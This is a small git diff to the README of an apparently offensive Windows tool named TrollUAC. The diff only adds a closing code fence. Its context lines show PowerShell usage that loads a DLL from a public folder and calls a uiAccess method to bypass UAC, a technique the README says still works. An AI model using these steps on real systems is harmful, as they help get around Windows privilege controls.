@@ -23,6 +23,7 @@ Refer to article for full explanation, technique is 5 years old but still works 
 > Start with Medium Integrity
 > [System.Reflection.Assembly]::LoadFrom("C:\users\public\TrollUAC.dll")   //can Load() as well 
 > [TrollUAC]::uiAccessPlease("notepad")
+```
 
 # OPSEC
 - This project is declared 100% opsec unsafe
